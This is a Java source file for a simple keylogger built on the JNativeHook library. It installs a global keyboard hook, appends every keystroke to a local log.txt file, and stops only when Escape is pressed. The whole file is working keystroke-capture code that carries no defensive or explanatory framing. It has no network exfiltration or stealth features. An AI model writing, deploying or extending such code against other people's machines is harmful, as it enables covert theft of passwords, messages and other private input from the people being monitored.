package com.pvtoari.keylogger;

import java.io.FileNotFoundException;
import java.io.PrintWriter;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class listener implements NativeKeyListener {
	private String logging = "";
	private PrintWriter pw;

	public listener() {
		try {
			pw = new PrintWriter("log.txt");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		if (e.getKeyCode() == NativeKeyEvent.VC_SPACE) {
			pw.append(" ");
			pw.flush();
		} else if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
			pw.append("\n");
			pw.flush();
		} else if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
			try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException nativeHookException) {
				nativeHookException.printStackTrace();
			}
		} else {
			pw.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
			pw.flush();
		}
	}
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new listener());
	}
}